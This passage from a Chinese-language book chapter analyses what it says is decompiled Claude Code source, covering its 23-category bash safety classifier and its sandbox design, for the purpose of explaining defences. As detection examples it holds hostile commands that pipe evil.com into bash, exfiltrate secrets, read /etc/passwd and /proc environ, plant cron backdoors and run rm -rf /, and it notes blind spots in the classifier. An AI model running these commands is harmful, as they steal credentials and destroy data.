  BACKSLASH_ESCAPED_WHITESPACE: 15, // Backslash-escaped whitespace
  BRACE_EXPANSION: 16,              // Brace expansion attack
  CONTROL_CHARACTERS: 17,           // Control character injection
  UNICODE_WHITESPACE: 18,           // Unicode whitespace characters
  MID_WORD_HASH: 19,                // Hash in middle of word
  ZSH_DANGEROUS_COMMANDS: 20,       // Zsh dangerous cmds (ztcp, zsocket)
  BACKSLASH_ESCAPED_OPERATORS: 21,  // Backslash-escaped operators
  COMMENT_QUOTE_DESYNC: 22,         // Comment/quote desynchronization
  QUOTED_NEWLINE: 23                // Newline inside quotes
};
```

这 23 种检测可以分为几个大类：

```
Tengu Detection Categories (23 total)
│
├─ Injection Attacks (7)
│   ├─ #5  SHELL_METACHARACTERS       ;  |  &  injection
│   ├─ #6  DANGEROUS_VARIABLES        $VAR in redirect/pipe
│   ├─ #8  COMMAND_SUBSTITUTION       $(curl evil.com | bash)
│   ├─ #9  INPUT_REDIRECTION          < /etc/passwd
│   ├─ #10 OUTPUT_REDIRECTION         > /etc/cron.d/backdoor
│   ├─ #11 IFS_INJECTION              IFS=/ to split paths
│   └─ #12 GIT_COMMIT_SUBSTITUTION    git commit -m "$(cmd)"
│
├─ Obfuscation Detection (6)
│   ├─ #4  OBFUSCATED_FLAGS           -\x2Df → --f
│   ├─ #15 BACKSLASH_WHITESPACE       cmd\ arg (hidden space)
│   ├─ #16 BRACE_EXPANSION            {r,m} → rm
│   ├─ #17 CONTROL_CHARACTERS         \x1b[2K terminal escape
│   ├─ #18 UNICODE_WHITESPACE         zero-width space, etc.
│   └─ #21 BACKSLASH_OPERATORS        \| \; hiding operators
│
├─ Exploit Vectors (5)
│   ├─ #2  JQ_SYSTEM_FUNCTION         jq 'system("rm -rf /")'
│   ├─ #3  JQ_FILE_ARGUMENTS          jq -f malicious.jq
│   ├─ #13 PROC_ENVIRON_ACCESS        /proc/*/environ leak
│   ├─ #14 MALFORMED_TOKEN            token boundary confusion
│   └─ #20 ZSH_DANGEROUS_COMMANDS     ztcp, zsocket
│
├─ Structural Issues (4)
│   ├─ #1  INCOMPLETE_COMMANDS        starts with tab/flag
│   ├─ #7  NEWLINES                   multi-line command
│   ├─ #19 MID_WORD_HASH              word#comment confusion
│   └─ #22 COMMENT_QUOTE_DESYNC       unmatched quotes + #
│
└─ Quote Safety (1)
    └─ #23 QUOTED_NEWLINE             newline inside quotes
```

### 14.6.2 检测示例

每种检测针对一类特定的攻击手法：

```javascript
// 1. Command substitution in dangerous context
// Input: echo $(curl evil.com/script | bash)
// → DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION → "ask"

// 2. Variable injection into pipe
// Input: cat $SENSITIVE_FILE | curl evil.com
// → DANGEROUS_VARIABLES → "ask"

// 3. jq system() exploitation
// Input: jq 'system("rm -rf /")'
// → JQ_SYSTEM_FUNCTION → "ask"

// 4. Git commit message injection
// Input: git commit -m "$(curl evil.com)"
// → GIT_COMMIT_SUBSTITUTION → "ask"

// 5. Control character hiding
// Input: echo "\x1b[2K\x1b[1A" | rm -rf /
// → CONTROL_CHARACTERS → "ask"

// 6. Brace expansion attack
// Input: echo {/etc/passwd,/dev/null}
// → BRACE_EXPANSION → "ask"

// 7. Unicode whitespace confusion
// Input: cat\u200B/etc/passwd  (zero-width space)
// → UNICODE_WHITESPACE → "ask"
```

### 14.6.3 分类器返回值

每个检测函数返回一个行为标记，决定命令的后续处理：

```
Detection Result
  │
  ├─ { behavior: "allow" }        ← Safe, auto-approve
  ├─ { behavior: "ask", message }  ← Needs user confirmation
  ├─ { behavior: "deny", message } ← Directly reject
  └─ { behavior: "passthrough" }   ← Not applicable, pass to next
```

检测链的执行是**短路**的 — 遇到第一个非 `passthrough` 的结果就停止。这意味着如果一条命令触发了 `deny`，即使它在其他检测中可能是安全的，也会被直接拒绝。

> **设计决策**：大多数检测返回 `"ask"` 而非 `"deny"`，这是一个重要的人机交互设计。Tengu 的角色不是决策者而是"预警系统" — 它标记可疑命令并展示给用户，由用户决定是否继续。这避免了过度拦截导致的用户挫败感，同时确保危险操作不会在无人注意的情况下执行。

### 14.6.4 为什么叫 "Tengu"

Tengu（天狗）是日本神话中的守护精灵，以警觉和守护闻名。用这个名字命名安全分类器，暗示它的角色是"守护者" — 不是执行者，而是在危险靠近时发出警告。

**小结**：Tengu 安全分类器通过 23 种模式检测覆盖了注入攻击、混淆技术、漏洞利用和结构异常四大类威胁。它与沙箱形成互补 — 沙箱限制命令"能做什么"，Tengu 检测命令"想做什么"。大多数检测返回 `"ask"` 而非 `"deny"`，将最终决策权交给用户。

---

## 14.7 沙箱与权限系统协同：autoAllowBashIfSandboxed

沙箱和权限系统不是孤立运作的。Claude Code 通过 `autoAllowBashIfSandboxed` 机制实现了两者的精妙协同 — 沙箱的存在改变了权限系统的行为。

### 14.7.1 权限决策流程

当 `autoAllowBashIfSandboxed = true`（默认值）且沙箱已启用时，Bash 命令在通过安全分类器后会被自动允许，无需弹出权限确认对话框：

```
Bash("npm install")
  │
  ▼
deny rule check ──── match deny ──→ REJECT
  │ (no match)
  ▼
ask rule check  ──── match ask  ──→ prompt user for confirmation
  │ (no match)
  ▼
sandbox enabled + autoAllowBashIfSandboxed?
  │
  ├─ YES → AUTO-ALLOW (sandbox isolation guarantees safety)
  │
  └─ NO  → standard permission flow
              │
              ▼
           Tengu classifier (23 detections)
              │
              ├─ "ask"   → prompt user for confirmation
              └─ "allow" → allow execution
```

这个设计的核心洞察是：**如果沙箱能确保命令不会造成不可逆损害，那么逐条确认每条命令就是不必要的摩擦**。用户启用沙箱的意图就是"让 Agent 自由执行，但在安全围栏内"。

### 14.7.2 文件写入的沙箱保护检查 — `tV6()` (isPathSandboxProtected)

沙箱的保护不仅作用于 Bash 命令，还影响 Write/Edit 工具的权限判断。`tV6()` 检查一个文件路径是否在沙箱的写入白名单内：

```javascript
// modules/09_data_processing.js, line ~16005
function tV6(path) {
  if (!sandbox.isSandboxingEnabled()) return false;

  let { allowOnly, denyWithinAllow } = sandbox.getFsWriteConfig();
  let resolvedPaths = resolvePath(path);
  let allowPatterns = allowOnly.flatMap(expand);
  let denyPatterns = denyWithinAllow.flatMap(expand);

  // Path in allow list AND not in deny list → sandbox-protected
  return resolvedPaths.every(p => {
    for (let deny of denyPatterns)
      if (matchGlob(p, deny)) return false;
    return allowPatterns.some(allow => matchGlob(p, allow));
  });
}
```

这意味着：即使权限系统没有显式的 allow 规则，如果文件路径在沙箱的写入白名单内（且不在拒绝名单中），Write/Edit 工具也可以自动允许。沙箱配置成为了权限系统的"补充授权来源"。

### 14.7.3 违规信息反馈 — `Zu4()` (injectViolationsToStderr)

沙箱阻止的操作不会悄悄消失 — 它们会被注入到命令的 stderr 输出中，让 AI 模型"看到"：

```javascript
// modules/09_data_processing.js, line ~14105
function Zu4(command, stderr) {
  if (!config) return stderr;
  let violations = violationStore.getViolationsForCommand(command);
  if (violations.length === 0) return stderr;

  let result = stderr;
  result += EOL + "<sandbox_violations>" + EOL;
  for (let v of violations) result += v.line + EOL;
  result += "</sandbox_violations>";
  return result;
}
```

违规信息使用 `<sandbox_violations>` XML 标签包裹，AI 模型可以解析这个标签来了解命令被阻止了哪些操作，从而调整后续策略。例如：

```
$ npm install some-package
npm ERR! EACCES: permission denied, open '/home/user/.npmrc'

<sandbox_violations>
Sandbox: deny(1) file-write-create /home/user/.npmrc
</sandbox_violations>
```

模型看到这个输出后，可能会改为使用 `--prefix` 参数或在允许的目录中创建 `.npmrc`。

### 14.7.4 违规记录存储 — `CGH` (ViolationStore) 类

违规事件由 `CGH` 类管理，它维护一个有界的违规记录列表：

```javascript
// modules/09_data_processing.js, line ~13611
class CGH {
  violations = [];
  totalCount = 0;
  maxSize = 100;       // Keep at most 100 violation records
  listeners = new Set;

  addViolation(v) {
    this.violations.push(v);
    this.totalCount++;
    if (this.violations.length > this.maxSize) {
      this.violations = this.violations.slice(-this.maxSize);  // Keep newest
    }
    this.notifyListeners();
  }

  getViolationsForCommand(command) {
    let encoded = encode(command);
    return this.violations.filter(v => v.encodedCommand === encoded);
  }
}
```

最大 100 条的限制防止了长时间运行时内存溢出。`slice(-this.maxSize)` 保留最新的记录，丢弃最旧的。

### 14.7.5 资源清理 — `gV6()` (cleanupSandbox)

进程退出时，沙箱需要清理所有子进程和临时文件：

```javascript
// modules/09_data_processing.js, line ~14007
async function gV6() {
  // 1. Clean bwrap mount points (Linux)
  xV6();

  // 2. Stop violation monitor (macOS)
  if (stopMonitor) { stopMonitor(); stopMonitor = undefined; }

  // 3. Terminate Linux bridge processes
  if (linuxBridge) {
    // SIGTERM → wait 5s → SIGKILL
    kill(httpBridgeProcess, "SIGTERM");
    kill(socksBridgeProcess, "SIGTERM");
    // Clean Unix socket files
    fs.rmSync(httpSocketPath, { force: true });
    fs.rmSync(socksSocketPath, { force: true });
  }

  // 4. Close proxy servers
  httpProxy?.close();
  socksProxy?.close();
}
```

清理顺序遵循"先停止生产者，再清理资源"的原则：先终止桥接进程（不再产生新的 socket 连接），再删除 socket 文件（清理通信通道），最后关闭代理服务器。

> **设计决策**：`autoAllowBashIfSandboxed` 是沙箱设计中最关键的用户体验决策。没有它，沙箱虽然安全，但每条命令仍需确认，用户会直接关闭沙箱来提高效率。有了它，沙箱变成了"开启后就不需要额外操作"的透明保护层 — 安全性和效率不再矛盾。

**小结**：`autoAllowBashIfSandboxed` 让沙箱化的命令跳过权限确认，将沙箱从"额外的安全负担"变为"自动化安全保障"。违规信息通过 `<sandbox_violations>` 标签注入 stderr，让 AI 模型具备安全感知能力并能自适应调整行为。资源清理确保进程退出时不留残留。

---

## 14.8 设计启示：多层防御在 Agent 安全中的应用

Claude Code 的沙箱系统展现了一套完整的 Agent 安全架构思路。以下是从中提炼的设计原则和可复用的模式。

### 启示 1：纵深防御（Defense in Depth）

```
                Attack: malicious npm postinstall script
                         │
Layer 3 (Tengu):         │  ← May not detect (indirect execution)
                         │
Layer 2 (Permission):    │  ← "npm install" was allowed by user
                         │
Layer 1 (Sandbox):       ╳  ← BLOCKED: write to .bashrc denied
                              BLOCKED: network to evil.com denied
```

单层防御总有盲点。Tengu 无法检测 npm postinstall 脚本中的恶意行为（因为它只分析用户提交的命令，不分析子进程）。权限系统允许了 `npm install`（因为这是合法操作）。但沙箱在 OS 层面阻止了恶意脚本写入 `.bashrc` 和连接恶意服务器。三层叠加，任何一层的漏洞都被其他层弥补。

### 启示 2：代理模式优于二元控制

```
❌ Binary approach:
   network = true/false  → npm install breaks without network

✅ Proxy approach:
   network → proxy → domain filter → selective allow/deny
   → npm install works (registry.npmjs.org allowed)
   → data exfiltration blocked (evil.com denied)
```

将网络控制从"开关"升级为"代理+过滤"，在保留功能的同时实现精确的安全控制。这个模式可以推广到文件系统（代理文件操作而非二元的可读/不可读）、API 调用（代理 API 请求而非全面允许/禁止）等场景。

### 启示 3：违规可观测性（Violation Observability）

```
Traditional: command fails with cryptic error
   → Agent retries with same approach
   → Infinite loop

Claude Code: sandbox violation injected into stderr
   → Agent sees "<sandbox_violations>deny file-write .bashrc</sandbox_violations>"
   → Agent understands the constraint
   → Agent adjusts strategy (e.g., use different path)
```

让 AI 模型"看到"安全约束的存在，比简单的失败更有价值。模型可以从违规信息中学习，调整后续行为，而不是在相同的限制上反复碰壁。

### 启示 4：安全应该是透明的

`autoAllowBashIfSandboxed` 的设计说明了一个核心原则：**最好的安全机制是用户不需要感知的安全机制**。如果安全措施增加了用户的操作负担（每条命令都需要确认），用户最终会选择关闭安全措施。沙箱让安全检查变成了后台自动运行的保护层。

### 启示 5：平台抽象与差异化实现

```
Unified interface: Xu4(command, readConfig, writeConfig, networkConfig)
         │
    ┌────┴────┐
    │         │
  macOS     Linux
  esq()     isq()
  SBPL      bwrap
  profile   namespace
```

统一的配置接口（`Xu4`）隐藏了 macOS 和 Linux 完全不同的实现细节。上层代码只需要描述"允许写什么"、"拒绝读什么"、"允许哪些域名"，不需要关心底层是 SBPL 还是 bwrap。这使得未来扩展到 Windows（可能使用 Windows Sandbox 或 WSL2）变得可行。

### 启示 6：声明式安全策略

```json
{
  "sandbox": {
    "filesystem": {
      "allowWrite": ["."],
      "denyWrite": [".git/hooks"],
      "denyRead": ["/etc/shadow"]
    },
    "network": {
      "allowedDomains": ["*.npmjs.org"],
      "deniedDomains": ["*.evil.com"]
    }
  }
}
```

安全策略用声明式 JSON 而非命令式代码表达。这使得非开发者（如安全管理员）也能配置策略，也使得策略审计变得简单 — 读一段 JSON 就能了解系统的安全边界。

**小结**：Claude Code 的沙箱设计提供了六个可推广的安全架构原则 — 纵深防御弥补单层盲点，代理模式实现精确控制，违规可观测性让 AI 自适应，透明安全避免用户绕过，平台抽象支持跨平台扩展，声明式策略简化配置和审计。

---

## 速查表

### 核心函数速查（4 列）

| 混淆名 | 推测英文名 | 位置 | 用途 |
|---------|-----------|------|------|
| `vC()` | shouldEnableSandbox | `15_hooks_system.js:~6994` | 判断单条命令是否需要沙箱化 |
| `TL_()` | getSandboxConfig | `09_data_processing.js:~14551` | 检查沙箱是否全局可用 |
| `KL_()` | isSettingEnabled | `09_data_processing.js:~14518` | 检查 sandbox.enabled 设置 |
| `QV6()` | isPlatformEnabled | `09_data_processing.js:~14539` | 检查平台是否在启用列表中 |
| `Eu4()` | isAutoAllowEnabled | `09_data_processing.js:~14526` | 检查 autoAllowBashIfSandboxed |
| `Cu4()` | isUnsandboxedAllowed | `09_data_processing.js:~14530` | 检查 allowUnsandboxedCommands |
| `bu4()` | isFailRequired | `09_data_processing.js:~14534` | 检查 failIfUnavailable |
| `js1()` | isCommandExcluded | `15_hooks_system.js:~6952` | 命令是否在排除列表中 |
| `HL_()` | buildSandboxConfig | `09_data_processing.js:~14394` | 合并 5 层设置构建统一配置 |
| `Bu4()` | wrapWithSandboxOuter | `09_data_processing.js:~14625` | 沙箱包装外层入口 |
| `Xu4()` | buildSandboxWrapper | `09_data_processing.js:~13920` | 构建沙箱配置并分发到平台 |
| `esq()` | wrapWithSeatbelt | `09_data_processing.js:~13517` | macOS sandbox-exec 包装 |
| `qu4()` | generateSbplProfile | `09_data_processing.js:~13469` | 生成 Seatbelt SBPL 策略 |
| `Htq()` | startViolationMonitor | `09_data_processing.js:~13557` | macOS 违规日志监控 |
| `isq()` | generateBwrapArgs | `09_data_processing.js:~13279` | Linux bwrap 参数构建 |
| `sI4()` | buildMountArgs | `09_data_processing.js:~13191` | Linux 文件系统挂载构建 |
| `Au4()` | initializeSandbox | `09_data_processing.js:~13728` | 沙箱初始化（代理/监控/桥接） |
| `Tu4()` | startHttpProxy | `09_data_processing.js:~13698` | 启动 HTTP 代理服务器 |
| `zu4()` | startSocksProxy | `09_data_processing.js:~13715` | 启动 SOCKS5 代理服务器 |
| `lsq()` | startSocatBridge | `09_data_processing.js:~13102` | Linux socat 桥接进程启动 |
| `Otq()` | filterDomains | `09_data_processing.js:~13667` | 域名过滤决策 |
| `cZ_()` | generateProxyEnvVars | `09_data_processing.js:~12813` | 生成代理环境变量 |
| `SQH()` | getDefaultWritePaths | `09_data_processing.js:~12808` | 默认安全写入路径 |
| `tI4()` | buildDangerousFileDenyList | `09_data_processing.js:~13375` | 构建危险文件拒绝列表 |
| `Zu4()` | injectViolationsToStderr | `09_data_processing.js:~14105` | 违规信息注入 stderr |
| `gV6()` | cleanupSandbox | `09_data_processing.js:~14007` | 完整资源清理 |
| `tV6()` | isPathSandboxProtected | `09_data_processing.js:~16005` | 路径是否在沙箱写入白名单 |
| `CGH` | ViolationStore | `09_data_processing.js:~13611` | 违规记录存储类 |
| `Q1` | TenguCategories | `11_api_streaming.js:~13327` | 安全分类器 23 种检测类别 |

### 沙箱配置速查（4 列）

| 配置项 | 类型 | 默认值 | 说明 |
|--------|------|--------|------|
| `sandbox.enabled` | boolean | `false` | 全局沙箱开关 |
| `sandbox.autoAllowBashIfSandboxed` | boolean | `true` | 沙箱化命令自动允许 |
| `sandbox.allowUnsandboxedCommands` | boolean | `true` | 允许 dangerouslyDisableSandbox |
| `sandbox.failIfUnavailable` | boolean | `false` | 沙箱不可用时拒绝执行 |
| `sandbox.excludedCommands` | string[] | `[]` | 排除的命令模式（支持通配符） |
| `sandbox.enabledPlatforms` | string[] | `["macos","linux"]` | 启用沙箱的平台 |
| `sandbox.network.allowedDomains` | string[] | `[]` | 允许的域名（支持 `*.` 通配符） |
| `sandbox.network.deniedDomains` | string[] | `[]` | 拒绝的域名 |
| `sandbox.filesystem.allowWrite` | string[] | `["."]` | 允许写入的路径 |
| `sandbox.filesystem.denyWrite` | string[] | `[]` | 拒绝写入的路径 |
| `sandbox.filesystem.denyRead` | string[] | `[]` | 拒绝读取的路径 |
| `sandbox.filesystem.allowRead` | string[] | `[]` | 在拒绝区内重新允许读取的路径 |
| `sandbox.ignoreViolations` | string[] | `[]` | 忽略的违规模式 |

### macOS vs Linux 实现对比（4 列）

| 维度 | macOS (Seatbelt) | Linux (Bubblewrap) | 说明 |
|------|-------------------|--------------------|----|
| 隔离机制 | sandbox-exec + SBPL | bwrap + namespace | macOS 用策略语言，Linux 用内核命名空间 |
| 文件写入控制 | `(deny file-write*)` 规则 | `--ro-bind` 覆盖挂载 | 不同机制，相同效果 |
| 文件读取遮蔽 | `(deny file-read* (subpath ...))` | `--tmpfs` / `--ro-bind /dev/null` | Linux 需要物理挂载覆盖 |
| 网络隔离 | 允许 localhost 代理端口 | `--unshare-net` + socat 桥接 | Linux 隔离更彻底但需要桥接 |
| Unix socket | SBPL 规则控制 | seccomp BPF 过滤器 | Linux 需要额外的 seccomp 层 |
| 违规监控 | `log stream` 实时捕获 | 无原生支持 | macOS 有内建日志基础设施 |
| 进程隔离 | `same-sandbox` 约束 | `--unshare-pid` | Linux PID 命名空间更强 |
| 依赖项 | 内建（无需安装） | bwrap + socat（需安装） | macOS 零依赖 |

### Tengu 23 类检测速查（4 列）

| ID | 名称 | 检测内容 | 示例 |
|----|------|---------|------|
| 1 | INCOMPLETE_COMMANDS | 以 tab/flag/分隔符开头 | `\t rm -rf /` |
| 2 | JQ_SYSTEM_FUNCTION | jq 中的 system() 调用 | `jq 'system("cmd")'` |
| 3 | JQ_FILE_ARGUMENTS | jq 文件参数 | `jq -f evil.jq` |
| 4 | OBFUSCATED_FLAGS | 混淆的标志参数 | `-\x2Df` → `--f` |
| 5 | SHELL_METACHARACTERS | Shell 元字符注入 | `cmd ; rm -rf /` |
| 6 | DANGEROUS_VARIABLES | 重定向/管道中的变量 | `cat $F \| curl` |
| 7 | NEWLINES | 命令中的换行符 | `cmd\nrm -rf /` |
| 8 | COMMAND_SUBSTITUTION | 危险的命令替换 | `$(curl evil \| bash)` |
| 9 | INPUT_REDIRECTION | 输入重定向攻击 | `cmd < /etc/passwd` |
| 10 | OUTPUT_REDIRECTION | 输出重定向攻击 | `cmd > /etc/cron.d/x` |
| 11 | IFS_INJECTION | IFS 变量注入 | `IFS=/ cmd` |
| 12 | GIT_COMMIT_SUBSTITUTION | git commit 中的命令替换 | `git commit -m "$(cmd)"` |
| 13 | PROC_ENVIRON_ACCESS | /proc/*/environ 访问 | `cat /proc/1/environ` |
| 14 | MALFORMED_TOKEN | 畸形 token 注入 | token 边界混淆 |
| 15 | BACKSLASH_WHITESPACE | 反斜杠转义空白 | `cmd\ arg` |
| 16 | BRACE_EXPANSION | 大括号展开攻击 | `{r,m} -rf /` |
| 17 | CONTROL_CHARACTERS | 控制字符注入 | `\x1b[2K` 终端转义 |
| 18 | UNICODE_WHITESPACE | Unicode 空白字符 | 零宽空格隐藏 |
| 19 | MID_WORD_HASH | 单词中的 # 号 | `word#comment` 混淆 |
| 20 | ZSH_DANGEROUS_COMMANDS | Zsh 危险命令 | `ztcp`, `zsocket` |
| 21 | BACKSLASH_OPERATORS | 反斜杠转义运算符 | `\|`, `\;` 隐藏 |
| 22 | COMMENT_QUOTE_DESYNC | 注释/引号不同步 | 未匹配引号 + # |
| 23 | QUOTED_NEWLINE | 引号内换行符 | `"line1\nline2"` |

---

*基于 Claude Code v2.1.86 反编译源码分析。函数名为混淆后的名称，括号内为推测的原始英文名。*
